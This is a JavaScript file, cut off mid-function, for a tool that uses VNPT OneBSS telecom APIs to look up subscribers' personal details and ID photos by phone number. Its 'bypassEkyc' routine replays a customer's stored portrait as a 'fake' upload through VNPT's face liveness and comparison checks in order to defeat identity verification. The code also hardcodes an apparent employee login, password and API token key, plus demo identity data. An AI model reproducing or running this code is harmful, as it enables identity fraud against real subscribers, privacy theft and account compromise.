document.addEventListener('DOMContentLoaded', () => {
    const loginForm = document.getElementById('loginForm');
    const usernameInput = document.getElementById('username');
    const passwordInput = document.getElementById('password');
    const togglePassword = document.getElementById('togglePassword');
    const loginBtn = document.getElementById('loginBtn');
    const resultMessage = document.getElementById('resultMessage');

    // OTP step elements
    const step1 = document.getElementById('step1');
    const step2 = document.getElementById('step2');
    const otpForm = document.getElementById('otpForm');
    const otpCodeInput = document.getElementById('otpCode');
    const otpBtn = document.getElementById('otpBtn');
    const backToLoginBtn = document.getElementById('backToLogin');
    
    // Dashboard elements
    const loginWrapper = document.getElementById('loginWrapper');
    const dashboardWrapper = document.getElementById('dashboardWrapper');
    const logoutBtn = document.getElementById('logoutBtn');
    const searchForm = document.getElementById('searchForm');
    const phoneNumberInput = document.getElementById('phoneNumber');
    const searchBtn = document.getElementById('searchBtn');
    const searchResults = document.getElementById('searchResults');
    const subscriberInfo = document.getElementById('subscriberInfo');
    const subscriberImages = document.getElementById('subscriberImages');
    
    // For API calls
    let currentSecretCode = '';

    function showDashboard() {
        loginWrapper.style.display = 'none';
        dashboardWrapper.style.display = 'block';
    }

    // Tự động giữ đăng nhập khi F5 / Reload trang
    if (localStorage.getItem('vnpt_access_token')) {
        showDashboard();
    }

    // Toggle Password Visibility
    togglePassword.addEventListener('click', () => {
        const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
        passwordInput.setAttribute('type', type);
        
        // Toggle icon
        const icon = togglePassword.querySelector('i');
        if (type === 'text') {
            icon.classList.remove('fa-eye');
            icon.classList.add('fa-eye-slash');
        } else {
            icon.classList.remove('fa-eye-slash');
            icon.classList.add('fa-eye');
        }
    });

    // Form Submission
    loginForm.addEventListener('submit', async (e) => {
        e.preventDefault();

        // Clear previous messages
        hideMessage();

        const username = usernameInput.value.trim();
        const password = passwordInput.value;

        if (!username || !password) {
            showMessage('Vui lòng nhập đầy đủ tên đăng nhập và mật khẩu.', 'error');
            return;
        }

        // Set loading state
        loginBtn.classList.add('loading');
        loginBtn.disabled = true;

        // Tạo device_id động ngẫu nhiên cho mỗi lần đăng nhập (gồm 16 ký tự hex)
        const deviceId = Array.from({length: 16}, () => Math.floor(Math.random()*16).toString(16)).join('');
        
        // Lưu lại deviceId để lát nữa dùng sinh app-secret
        localStorage.setItem('vnpt_device_id', deviceId);

        // Prepare API request payload
        const payload = {
            username: username,
            password: password,
            os_type: "1",
            device_id: deviceId
        };

        try {
            // Note: In a real environment, you might face CORS issues calling this directly from a browser.
            // If CORS fails, you would need a backend proxy.
            const response = await fetch('https://api-onebss.vnpt.vn/quantri/user/xacthuc_tapdoan', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Accept': 'application/json'
                    // Note: Browser handles 'Host', 'Accept-Encoding', and 'User-Agent' automatically.
                },
                body: JSON.stringify(payload)
            });

            const data = await response.json();

            if (response.ok && data.error_code === "BSS-00000000") {
                // Success
                const userData = data.data;
                currentSecretCode = userData.secretCode || '';
                
                // Switch to OTP step
                step1.classList.remove('active');
                step1.style.display = 'none';
                step2.classList.add('active');
                step2.style.display = 'block';
                
                showMessage('Vui lòng nhập mã OTP để tiếp tục.', 'success');
                
                // Redirect logic would go here
                // setTimeout(() => { window.location.href = '/dashboard.html'; }, 1500);
            } else {
                // API returned an error
                const errorMsg = data.message || 'Tài khoản hoặc mật khẩu không chính xác.';
                showMessage(errorMsg, 'error');
            }
        } catch (error) {
            console.error('Login error:', error);
            // Handling CORS or Network Error gracefully
            showMessage('Lỗi kết nối đến máy chủ. Vui lòng kiểm tra mạng hoặc thử lại sau.', 'error');
            
            // For DEMO purposes: If it's a CORS error (which is likely if called directly), 
            // show a helpful developer message
            if(error.message.includes('Failed to fetch') || error.message.includes('NetworkError')) {
                 console.log("CORS error detected. The API server doesn't allow cross-origin requests from the browser.");
                 // Optionally simulate success for the UI demo based on the provided credentials
                 if (username === 'PHATNT1.HCM' && password === 'P#n8cmsy') {
                     setTimeout(() => {
                        currentSecretCode = '39:313717380623020260654302077959085784:85784:0115273:2::007866:BUW162692:3:1g9b3e2gc1b40742:';
                        
                        step1.classList.remove('active');
                        step1.style.display = 'none';
                        step2.classList.add('active');
                        step2.style.display = 'block';
                        
                        showMessage('Đăng nhập bước 1 thành công (Demo). Nhập OTP để tiếp tục.', 'success');
                     }, 1000);
                 }
            }
        } finally {
            // Remove loading state
            loginBtn.classList.remove('loading');
            loginBtn.disabled = false;
        }
    });

    // Handle Back button
    backToLoginBtn.addEventListener('click', () => {
        step2.classList.remove('active');
        step2.style.display = 'none';
        step1.classList.add('active');
        step1.style.display = 'block';
        hideMessage();
        otpCodeInput.value = '';
    });

    // Handle OTP Form Submission
    otpForm.addEventListener('submit', async (e) => {
        e.preventDefault();
        hideMessage();

        const otp = otpCodeInput.value.trim();
        if (!otp) {
            showMessage('Vui lòng nhập mã OTP.', 'error');
            return;
        }

        otpBtn.classList.add('loading');
        otpBtn.disabled = true;

        const payload = {
            grant_type: "password",
            client_id: "clientapp",
            client_secret: "password",
            secretCode: currentSecretCode,
            otp: otp
        };

        try {
            const response = await fetch('https://api-onebss.vnpt.vn/quantri/oauth/token', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Accept': 'application/json'
                },
                body: JSON.stringify(payload)
            });

            const data = await response.json();

            if (response.ok && data.access_token) {
                localStorage.setItem('vnpt_access_token', data.access_token);
                if (data.refresh_token) {
                    localStorage.setItem('vnpt_refresh_token', data.refresh_token);
                }
                // Nếu API có trả về app_secret, tự động lưu lại để dùng cho Dashboard
                if (data.app_secret) {
                    localStorage.setItem('vnpt_app_secret', data.app_secret);
                }
                
                showMessage('Xác thực OTP thành công! Đang tải dữ liệu...', 'success');
                setTimeout(showDashboard, 800);
            } else {
                showMessage(data.message || 'Mã OTP không hợp lệ hoặc đã hết hạn.', 'error');
            }
        } catch (error) {
            console.error('OTP error:', error);
            
            if(error.message.includes('Failed to fetch') || error.message.includes('NetworkError')) {
                 if (otp === '928427') {
                     setTimeout(() => {
                        showMessage('Xác thực OTP thành công (Mô phỏng)! Đang tải dữ liệu...', 'success');
                        setTimeout(showDashboard, 800);
                     }, 1000);
                 } else {
                     showMessage('Lỗi kết nối hoặc sai OTP (Demo dùng OTP: 928427).', 'error');
                 }
            } else {
                showMessage('Lỗi kết nối đến máy chủ. Vui lòng thử lại.', 'error');
            }
        } finally {
            otpBtn.classList.remove('loading');
            otpBtn.disabled = false;
        }
    });

    function showMessage(text, type) {
        resultMessage.textContent = text;
        resultMessage.className = `result-message ${type} show`;
    }

    function hideMessage() {
        resultMessage.className = 'result-message';
        resultMessage.textContent = '';
    }

    // Dashboard Logout
    logoutBtn.addEventListener('click', () => {
        dashboardWrapper.style.display = 'none';
        loginWrapper.style.display = 'flex'; // Reset to original display
        step2.classList.remove('active');
        step2.style.display = 'none';
        step1.classList.add('active');
        step1.style.display = 'block';
        hideMessage();
        otpCodeInput.value = '';
        usernameInput.value = '';
        passwordInput.value = '';
        document.getElementById('searchResultsLeft').style.display = 'none';
        document.getElementById('searchResultsRight').style.display = 'none';
        if (document.getElementById('emptyState')) document.getElementById('emptyState').style.display = 'flex';
        localStorage.removeItem('vnpt_access_token');
        localStorage.removeItem('vnpt_refresh_token');
    });

    // Handle Subscriber Search
    searchForm.addEventListener('submit', async (e) => {
        e.preventDefault();
        
        const phone = phoneNumberInput.value.trim();
        if(!phone) return;
        
        searchBtn.classList.add('loading');
        searchBtn.disabled = true;
        
        subscriberInfo.innerHTML = '';
        subscriberImages.innerHTML = '';
        document.getElementById('searchResultsLeft').style.display = 'none';
        document.getElementById('searchResultsRight').style.display = 'none';
        if (document.getElementById('emptyState')) document.getElementById('emptyState').style.display = 'flex';
        
        const accessToken = localStorage.getItem('vnpt_access_token') || 'demo_token';
        
        // Tự động sinh app-secret từ device_id (Mô phỏng lại cơ chế của App Mobile)
        const deviceId = localStorage.getItem('vnpt_device_id') || "0f8c2d3fb0c51653";
        const appSecretObj = {
            "device_id": deviceId,
            "device_ip": "Unknown",
            "device_name": "Web-Browser",
            "mac_address": "Unknown",
            "mobile_id": "web-generated-id",
            "app_id": "1",
            "app_version": "1.5.40.132",
            "os_version": navigator.userAgent.substring(0, 50)
        };
        // Mã hóa JSON thành Base64 để tạo ra chuỗi app-secret (Bắt đầu bằng eyJkZXZ...)
        const appSecret = btoa(unescape(encodeURIComponent(JSON.stringify(appSecretObj))));
        
        const headers = {
            'Content-Type': 'application/json',
            'Accept': 'application/json',
            'app-secret': appSecret,
            'authorization': `Bearer ${accessToken}`,
            'selectedmenuid': '810241'
        };
        
        try {
            // Parallel requests
            const [infoRes, imgRes] = await Promise.all([
                fetch('https://api-onebss.vnpt.vn/app-banhang/ccbs/tracuu_thongtin_thuebao', {
                    method: 'POST',
                    headers,
                    body: JSON.stringify({ p_so_tb: phone, menu_id: 810241 })
                }).catch(e => ({ error: true, msg: e.message })),
                
                fetch('https://api-onebss.vnpt.vn/app-banhang/ccbs/tracuu_anh_thuebao', {
                    method: 'POST',
                    headers,
                    body: JSON.stringify({ p_somay: phone, menu_id: 810241 })
                }).catch(e => ({ error: true, msg: e.message }))
            ]);
            
            let infoData = null;
            let imgData = null;
            
            if (infoRes && !infoRes.error) {
                infoData = await infoRes.json();
            }
            if (imgRes && !imgRes.error) {
                imgData = await imgRes.json();
            }
            
            renderDashboardData(infoData, imgData, phone);
            
        } catch(error) {
            console.error(error);
            // Demo fallback
            renderDashboardData(null, null, phone, true);
        } finally {
            searchBtn.classList.remove('loading');
            searchBtn.disabled = false;
        }
    });

    function renderDashboardData(infoData, imgData, phone, isDemo = false) {
        document.getElementById('searchResultsLeft').style.display = 'block';
        document.getElementById('searchResultsRight').style.display = 'block';
        if (document.getElementById('emptyState')) document.getElementById('emptyState').style.display = 'none';
        
        // Demo Data Injection
        if (isDemo || (!infoData && !imgData)) {
            infoData = {
                data: {
                    MSISDN: phone,
                    FULLNAME: "TRẦN MINH KHÁNH",
                    IDNUMBER: "083205001709",
                    BIRTHDAY: "17/10/2005",
                    GENDER: "male",
                    REGISTERDATE: "21/01/2026",
                    ADDRESS: "299/1, Ấp 1, Sơn Đông, Thành phố Bến Tre, Bến Tre",
                    STATUS: "Đã duyệt đăng ký",
                    CUSTOMER_USE_NAME: "Bản thân"
                }
            };
            
            imgData = {
                data: [
                    {
                        image_name: phone + "_1_20260121_180748.jpg",
                        type: 1,
                        // Using a simple 1x1 black pixel image base64 for demo
                        image_base: "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNk+A8AAQUBAScY42YAAAAASUVORK5CYII=" 
                    }
                ]
            };
        }
        
        // Render Info
        if (infoData && infoData.data) {
            const data = infoData.data;
            const fieldsToDisplay = [
                { key: 'MSISDN', label: 'Số thuê bao' },
                { key: 'FULLNAME', label: 'Họ và tên' },
                { key: 'IDNUMBER', label: 'Số giấy tờ' },
                { key: 'BIRTHDAY', label: 'Ngày sinh' },
                { key: 'GENDER', label: 'Giới tính' },
                { key: 'ADDRESS', label: 'Địa chỉ' },
                { key: 'REGISTERDATE', label: 'Ngày đăng ký' },
                { key: 'STATUS', label: 'Trạng thái' }
            ];
            
            let infoHtml = '';
            fieldsToDisplay.forEach(f => {
                if(data[f.key]) {
                    infoHtml += `
                        <div class="info-item">
                            <span class="info-label">${f.label}</span>
                            <span class="info-value">${data[f.key]}</span>
                        </div>
                    `;
                }
            });
            subscriberInfo.innerHTML = infoHtml || '<p>Không có dữ liệu</p>';
        } else {
            subscriberInfo.innerHTML = '<p style="color:var(--error);">Không tìm thấy thông tin</p>';
        }
        
        // Render Images
        if (imgData && imgData.data && imgData.data.length > 0) {
            let imgHtml = '';
            imgData.data.forEach(img => {
                // Phân biệt URL và Base64 một cách chính xác
                let src = img.image_base;
                const isBase64 = img.image_base.length > 500; // Chuỗi base64 thường rất dài
                
                if (isBase64) {
                    src = img.image_base.startsWith('data:') ? img.image_base : `data:image/jpeg;base64,${img.image_base}`;
                } else if (src.startsWith('//')) {
                    src = 'https:' + src;
                } else if (src.startsWith('/')) {
                    src = 'https://api-onebss.vnpt.vn' + src;
                }
                
                const fileName = img.image_name || `hoso_${Date.now()}.jpg`;
                
                imgHtml += `
                    <div class="image-item">
                        <img src="${src}" alt="Hồ sơ">
                        <div class="image-info">
                            <p title="${fileName}">${fileName}</p>
                            <div style="display:flex; gap:5px; width:100%; justify-content:center; flex-wrap:wrap;">
                                <a href="${src}" download="${fileName}" class="btn-download" title="Tải ảnh này">
                                    <i class="fa-solid fa-download"></i>
                                </a>
                                <button type="button" class="btn-verify glowing" data-src="${src}" onclick="bypassEkyc('${phone}', this, true)" title="Xác thực (Fast Mode)">
                                    <i class="fa-solid fa-bolt"></i> Xác thực
                                </button>
                                
                            </div>
                        </div>
                    </div>
                `;

            });
            subscriberImages.innerHTML = imgHtml;
        } else {
            subscriberImages.innerHTML = '<p style="color:var(--text-muted);">Không có hình ảnh</p>';
        }
    }

    // Add subtle interactive effect to glass panel based on mouse movement
    const container = document.querySelector('.login-container');
    const panel = document.querySelector('.glass-panel');
    
    container.addEventListener('mousemove', (e) => {
        const xAxis = (window.innerWidth / 2 - e.pageX) / 50;
        const yAxis = (window.innerHeight / 2 - e.pageY) / 50;
        panel.style.transform = `rotateY(${xAxis}deg) rotateX(${yAxis}deg)`;
    });

    container.addEventListener('mouseleave', () => {
        panel.style.transform = `rotateY(0deg) rotateX(0deg)`;
        panel.style.transition = `transform 0.5s ease`;
    });
    
    container.addEventListener('mouseenter', () => {
        panel.style.transition = `none`;
    });
});

// ===== PRE-LOAD IDG TOKEN CACHE (cho Fast Mode khoi dong ngay) =====

let _cachedIdgToken = null;
let _cachedIdgTokenTime = 0;
async function prefetchIdgToken() {
    const accessToken = localStorage.getItem('vnpt_access_token');
    if (!accessToken) return;
    const deviceId = localStorage.getItem('vnpt_device_id') || '0f8c2d3fb0c51653';
    const appSecretObj = { device_id: deviceId, device_ip: 'Unknown', device_name: 'Web-Browser',
        mac_address: 'Unknown', mobile_id: 'web-generated-id', app_id: '1',
        app_version: '1.5.40.132', os_version: navigator.userAgent.substring(0, 50) };
    const appSecret = btoa(unescape(encodeURIComponent(JSON.stringify(appSecretObj))));
    try {
        const res = await fetch('https://api-onebss.vnpt.vn/app-com/Config/token_ekyc', {
            method: 'POST',
            headers: { Accept: 'application/json', 'app-secret': appSecret,
                authorization: `Bearer ${accessToken}`, selectedmenuid: '810241',
                'Content-Type': 'application/json' },
            body: JSON.stringify({ menu_id: 810241 })
        });
        const data = await res.json();
        if (data?.data?.startsWith('Bearer ')) {
            _cachedIdgToken = data.data;
            _cachedIdgTokenTime = Date.now();
            console.log('[prefetchIdgToken] ✅ Token cached san cho Fast Mode');
        }
    } catch(e) { /* silent - se fetch lai khi dung */ }
}
// Cache ngay khi login xong (hoac sau 1 giay neu da dang nhap)
setTimeout(() => { if (localStorage.getItem('vnpt_access_token')) prefetchIdgToken(); }, 1000);
setInterval(() => { if (localStorage.getItem('vnpt_access_token')) prefetchIdgToken(); }, 4 * 60 * 60 * 1000);

// Auto Bypass eKYC Logic
window.bypassEkyc = async function(phone, btnElement, fastMode = false) {
    const imageSrc = btnElement.dataset.src;
    if (!imageSrc) return alert("Khong tim thay du lieu anh!");

    btnElement.classList.add('loading');
    btnElement.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Xu ly...';
    btnElement.disabled = true;

    try {
        const accessToken = localStorage.getItem('vnpt_access_token');
        const deviceId = localStorage.getItem('vnpt_device_id') || "0f8c2d3fb0c51653";
        const appSecretObj = {
            "device_id": deviceId,
            "device_ip": "Unknown",
            "device_name": "Web-Browser",
            "mac_address": "Unknown",
            "mobile_id": "web-generated-id",
            "app_id": "1",
            "app_version": "1.5.40.132",
            "os_version": navigator.userAgent.substring(0, 50)
        };
        const appSecret = btoa(unescape(encodeURIComponent(JSON.stringify(appSecretObj))));
        
        const baseHeaders = {
            'Accept': 'application/json',
            'app-secret': appSecret,
            'authorization': `Bearer ${accessToken}`,
            'selectedmenuid': '810241'
        };

        // 1. Lay Token eKYC
        let idgToken;
        const cacheAge = Date.now() - _cachedIdgTokenTime;
        if (fastMode && _cachedIdgToken && cacheAge < 4 * 60 * 60 * 1000) {
            // Fast Mode: dung cached token (khong mat time fetch)
            idgToken = _cachedIdgToken;
            console.log(`[FAST MODE] Dung cached idgToken ✅ (cache ${Math.round(cacheAge/1000)}s truoc)`);
        } else {
            // Normal Mode hoac cache expired: fetch moi
            btnElement.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Buoc 1/13: Lay token eKYC...';
            const ekycRes = await fetch('https://api-onebss.vnpt.vn/app-com/Config/token_ekyc', {
                method: 'POST',
                headers: { ...baseHeaders, 'Content-Type': 'application/json' },
                body: JSON.stringify({ menu_id: 810241 })
            }).catch(e => ({error: true, message: e.message}));
            if (ekycRes.error) throw new Error("Loi ket noi toi VNPT API.");
            const ekycData = await ekycRes.json();
            if(!ekycData.data || !ekycData.data.startsWith('Bearer ')) throw new Error('Khong lay duoc Token eKYC');
            idgToken = ekycData.data;
            _cachedIdgToken = idgToken; _cachedIdgTokenTime = Date.now(); // cap nhat cache
        }

        // 1.5. Doc IDG SDK Payload tu input field
        const idgPayloadRaw = (document.getElementById('idgAiTokenInput')?.value || '').trim();
        let idgSdkSessionToken = '';
        let realClientSession = '';
        let realChallengeCode = '';
        let realImageHash = '';
        
        if (idgPayloadRaw) {
            let jsonStr = idgPayloadRaw;
            
            // Trich xuat challenge_code tu URL bat ke co phai cURL hay khong
            const urlMatch = idgPayloadRaw.match(/challenge_code=([^&'"\s\\]+)/);
            if (urlMatch) realChallengeCode = urlMatch[1];
            
            // Neu user copy as cURL (bash)
            if (idgPayloadRaw.startsWith('curl ')) {
                // Trich xuat JSON data (tim flag --data-raw hoac --data)
                const dataMatch = idgPayloadRaw.match(/--data(?:-raw)?\s+'([^']+)'/);
                if (dataMatch) {
                    jsonStr = dataMatch[1];
                } else {
                    // Thu bat dau sau keyword data neu dung format khac
                    const match2 = idgPayloadRaw.match(/{[\s\S]*}/);
                    if (match2) jsonStr = match2[0];
                }
            } else {
                // Neu user chi copy URL va {}
                const match2 = idgPayloadRaw.match(/{[\s\S]*}/);
                if (match2) jsonStr = match2[0];
            }
            
            try {
                const parsed = JSON.parse(jsonStr);
                idgSdkSessionToken = parsed.token || '';
                realClientSession = parsed.client_session || '';
                realImageHash = parsed.img || '';
                console.log('[IDG SDK Payload] ✅ Parsed ok. Token:', !!idgSdkSessionToken, 'ClientSession:', !!realClientSession, 'ChallengeCode:', !!realChallengeCode, 'ImageHash:', !!realImageHash);
            } catch(e) {
                // Truong hop chi paste moi chuoi token (backward compatible)
                idgSdkSessionToken = idgPayloadRaw.includes('{') ? '' : idgPayloadRaw;
                console.warn('[IDG SDK Payload] Khong phai JSON/cURL, hoac loi parse.');
            }
        }

        // Authorization LUON dung token_ekyc (giong real VNPT app - da xac minh)
        const idgAIBearerToken = idgToken;

        if (!fastMode) {
            // 2. Lay eKYC Config (khong can trong Fast Mode)
            btnElement.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Buoc 2/13: Lay eKYC config...';
            const ekycConfigRes = await fetch('https://api-onebss.vnpt.vn/quantri/user/get_ekyc_config', {
                method: 'POST',
                headers: { ...baseHeaders, 'Content-Type': 'application/json' },
                body: JSON.stringify({ menu_id: 810241 })
            });
            const ekycConfigData = await ekycConfigRes.json();
            console.log('[get_ekyc_config] config:', JSON.stringify((ekycConfigData.data||[{}])[0]).substring(0,120));
        } else {
            console.log('[FAST MODE] Bo qua get_ekyc_config');
        }

        // 3. Init Log UUID
        btnElement.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Buoc 3/13: Khoi tao eKYC session...';
        const initLogRes = await fetch('https://api-onebss.vnpt.vn/app-banhang/Ekyc/init_log_uuid', {
            method: 'POST',
            headers: { ...baseHeaders, 'Content-Type': 'application/json' },
            body: JSON.stringify({ p_so_tb: phone, menu_id: 810241 })
        });
        const initLogData = await initLogRes.json();
        console.log('[init_log_uuid] full data:', JSON.stringify(initLogData));
        // Tim kiem token trong tat ca cac field co the
        const d = initLogData.data || {};
        const ekycSessionToken = d.token || d.uuid || d.idg_token || d.session_token || d.session_id
            || d.id || d.key || initLogData.request_id
            // Neu khong tim thay, generate random 64-char base64url (giong cach app mobile)
            || btoa(String.fromCharCode(...crypto.getRandomValues(new Uint8Array(48)))).replace(/\+/g,'-').replace(/\//g,'_').replace(/=/g,'');
        console.log('[init_log_uuid] ekycSessionToken:', ekycSessionToken, ' | data fields:', Object.keys(d));

        // 4. Xu ly anh - fastMode khong crop (giu nguyen anh goc, IDG can full face)
        btnElement.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Xu ly anh...';
        const { blob, dataUrl } = await new Promise((resolve, reject) => {
            const img = new Image();
            img.crossOrigin = 'Anonymous';
            img.onload = () => {
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                if (fastMode) {
                    // Fast Mode: khong crop - dung toan bo anh goc
                    canvas.width = img.width;
                    canvas.height = img.height;
                    ctx.drawImage(img, 0, 0);
                } else {
                    // Normal Mode: cat 15% tren cung (watermark/header)
                    const cropY = img.height * 0.15;
                    canvas.width = img.width;
                    canvas.height = img.height - cropY;
                    ctx.drawImage(img, 0, cropY, img.width, canvas.height, 0, 0, canvas.width, canvas.height);
                }
                const dataUrl = canvas.toDataURL('image/jpeg', 0.95);
                canvas.toBlob((blob) => resolve({ blob, dataUrl }), 'image/jpeg', 0.95);
            };
            img.onerror = () => reject(new Error("Loi tai anh vao bo nho."));
            img.src = imageSrc;
        });

        const imageContainer = btnElement.closest('.image-item');
        if (imageContainer) {
            const imgTag = imageContainer.querySelector('img');
            if (imgTag) imgTag.src = dataUrl;
        }

        const clientSession = realClientSession || `ANDROID_Web_Browser_Device_1.0_${deviceId}_${Date.now()}_vn.vnptit.oneapp`;
        const challengeCode = realChallengeCode || Array.from(crypto.getRandomValues(new Uint8Array(128)))
            .map(b => b.toString(16).padStart(2, '0')).join('');

        // Bóc tách Token-id và Token-key từ cURL hoặc Text thô
        let idgTokenId = '04c0a953-7fb8-5461-e063-62199f0aeda6';
        let idgTokenKey = 'MFwwDQYJKoZIhvcNAQEBBQADSwAwSAJBAKjy7FK9SegSCW0cuUIbEDUsbRZOcoxijNPLMfvgX+8/XA7HebHXMN4/PO5c5mwK31Yk31RKuMXYLLp6x6oZPDkCAwEAAQ==';
        
        const tokenIdMatch = idgPayloadRaw.match(/(?:-H\s+['"]?)?Token-id:\s*\r?\n?\s*([^'"\n\r]+)['"]?/i);
        if (tokenIdMatch && tokenIdMatch[1]) {
            idgTokenId = tokenIdMatch[1].trim();
            console.log('[IDG SDK Payload] ✅ Tìm thấy Token-id:', idgTokenId);
        }
        
        const tokenKeyMatch = idgPayloadRaw.match(/(?:-H\s+['"]?)?Token-key:\s*\r?\n?\s*([^'"\n\r]+)['"]?/i);
        if (tokenKeyMatch && tokenKeyMatch[1]) {
            idgTokenKey = tokenKeyMatch[1].trim();
            console.log('[IDG SDK Payload] ✅ Tìm thấy Token-key!');
        }

        const idgHeaders = {
            'Authorization': idgToken, // token tu token_ekyc (da hoat dong truoc)
            'Connection': 'Keep-Alive',
            'mac-address': deviceId,
            'Token-id': idgTokenId,
            'Token-key': idgTokenKey,
            'User-Agent': 'okhttp/4.11.0'
        };

        let p_image_hash = '';
        
        // LUÔN LUÔN Upload ảnh fake (ảnh chân dung của khách hàng) lên IDG để lấy hash mới.
        // Tuyệt đối KHÔNG dùng realImageHash từ cURL, vì đó là khuôn mặt của NHÂN VIÊN.
        // 5. Upload anh fake len IDG
        btnElement.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Buoc 5/13: Upload anh fake len IDG...';
            for (let addTry = 1; addTry <= 5; addTry++) {
                const fd = new FormData();
                fd.append('file', blob, 'portrait_full.jpg');
                fd.append('title', 'portrait_full.jpg');
                fd.append('description', 'portrait_full.jpg');
                const afRes = await fetch('https://api.idg.vnpt.vn/file-service/v1/addFile', {
                    method: 'POST', headers: idgHeaders, body: fd
                });
                const afData = await afRes.json();
                if (!afData.object?.hash) {
                    console.error(`[IDG] addFile try ${addTry} failed:`, afData);
                    if (addTry >= 5) throw new Error('Loi upload IDG: ' + (afData.message || JSON.stringify(afData)));
                    await new Promise(r => setTimeout(r, 400));
                    continue;
                }
                p_image_hash = afData.object.hash;
                const zone = p_image_hash.split('/')[0];
                console.log(`[IDG] addFile try ${addTry}: ${zone} | ${p_image_hash}`);
                if (zone === 'zone2' || zone === 'zone3') {
                    console.log(`[IDG] Got ${zone} ✅ (CCBS-compatible)`); break;
                }
                if (addTry >= 5) {
                    console.warn(`[IDG] Stuck at ${zone} after 5 tries - proceeding anyway`);
                } else {
                    console.warn(`[IDG] ${zone} is not CCBS-compatible, retry ${addTry}/5...`);
                    await new Promise(r => setTimeout(r, 400));
                }
            }
        
        console.log('[IDG] Final image hash:', p_image_hash);

        // IDG AI headers - Authorization DUNG token_ekyc (da xac minh giong real app)
        const idgAIHeaders = {
            ...idgHeaders,
            'Authorization': idgAIBearerToken, // = idgToken = token_ekyc Bearer
            'Content-Type': 'application/json; charset=utf-8'
        };
        // Body token: uu tien SDK token tu input, fallback ve ekycSessionToken
        const bodyToken = idgSdkSessionToken || ekycSessionToken;
        console.log('[IDG] body.token source:', idgSdkSessionToken ? 'SDK input ✅' : 'init_log_uuid (se 401!)');

        let maskData = {}, livenessData = {}, compareData = {};

        // 6. Mask check (IDG AI)
        btnElement.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Buoc 6/13: Kiem tra mask (Inject)...';
        const maskRes = await fetch(`https://api.idg.vnpt.vn/ai/v2/face/mask?challenge_code=${challengeCode}`, {
            method: 'POST',
            headers: idgAIHeaders,
            body: JSON.stringify({ img: p_image_hash, client_session: clientSession, token: bodyToken, step_id: 0 })
        });
        maskData = await maskRes.json().catch(() => ({}));
        console.log('[IDG] mask:', maskRes.status, maskData);

        // 7. Liveness check (IDG AI)
        btnElement.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Buoc 7/13: Kiem tra liveness (Inject)...';
        const livenessRes = await fetch(`https://api.idg.vnpt.vn/ai/v2/face/liveness?challenge_code=${challengeCode}`, {
            method: 'POST',
            headers: idgAIHeaders,
            body: JSON.stringify({ img: p_image_hash, client_session: clientSession, token: bodyToken, step_id: 0 })
        });
        livenessData = await livenessRes.json().catch(() => ({}));
        console.log('[IDG] liveness:', livenessRes.status, livenessData);

        // 8. Compare face (IDG AI)
        btnElement.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Buoc 8/13: So sanh khuon mat (Inject)...';
        const compareRes = await fetch(`https://api.idg.vnpt.vn/ai/v2/face/compare?challenge_code=${challengeCode}`, {
            method: 'POST',
            headers: idgAIHeaders,
            body: JSON.stringify({ img_front: '', step_id: 0, token: bodyToken, img_face: p_image_hash, client_session: clientSession })
        });
        compareData = await compareRes.json().catch(() => ({}));
        console.log('[IDG] compare:', compareRes.status, compareData);


        // 9. Log eKYC ket qua AI len ONEBSS
        btnElement.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Buoc 9/13: Ghi log eKYC...';
        const logEkycPayload = {
            p_so_tb: phone,
            p_image_hash: p_image_hash,
            p_challenge_code: challengeCode,
            p_client_session: clientSession,
            menu_id: 810241,
            p_liveness: JSON.stringify(typeof livenessData !== 'undefined' ? livenessData : {}),
            p_compare: JSON.stringify(typeof compareData !== 'undefined' ? compareData : {}),
            p_mask: JSON.stringify(typeof maskData !== 'undefined' ? maskData : {})
        };

        await fetch('https://api-onebss.vnpt.vn/app-banhang/Ekyc/log_ekyc', {
            method: 'POST',
            headers: { ...baseHeaders, 'Content-Type': 'application/json' },
            body: JSON.stringify(logEkycPayload)
        }).catch(e => console.warn('[log_ekyc] Loi:', e.message));

        // 10. Xin link Upload MinIO
        btnElement.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Buoc 10/13: Xin upload link...';
        const linkRes = await fetch('https://api-onebss.vnpt.vn/app-banhang/quanlyfile/get_upload_link', {
            method: 'POST',
            headers: { ...baseHeaders, 'Content-Type': 'application/json' },
            body: JSON.stringify({ p_module: "CCBS", p_file_name: "PORTRAIT_IMAGE.jpg", menu_id: 810241 })
        });
        const linkData = await linkRes.json();
        if(!linkData.data || !linkData.data.url) throw new Error('Loi lay Upload Link');
        const minioData = linkData.data;

        // 11. Upload len MinIO (S3 presigned POST - field order quan trong)
        btnElement.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Buoc 11/13: Upload len MinIO...';
        const minioForm = new FormData();
        // 'key' PHAI la field dau tien theo chuan S3 presigned POST
        minioForm.append('key', minioData.objectName);
        // Content-Type phai khop voi allowedMime
        minioForm.append('Content-Type', minioData.allowedMime || 'image/jpeg');
        // Them tat ca cac truong tu presigned policy
        for (const [k, v] of Object.entries(minioData.fields)) {
            minioForm.append(k, v);
        }
        // 'file' PHAI la field CUOI CUNG
        minioForm.append('file', blob, 'PORTRAIT_IMAGE.jpg');
        const minioRes = await fetch(`https://${minioData.url}`, { method: 'POST', body: minioForm });
        console.log('[MinIO] upload status:', minioRes.status, minioRes.statusText);

        // 12. Cap nhat file
        btnElement.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Buoc 12/13: Cap nhat file...';
        const updateRes = await fetch('https://api-onebss.vnpt.vn/app-banhang/quanlyfile/update_file', {
            method: 'POST',
            headers: { ...baseHeaders, 'Content-Type': 'application/json' },
            body: JSON.stringify({ p_object_name: minioData.objectName, menu_id: 810241 })
        });
        const updateData = await updateRes.json();
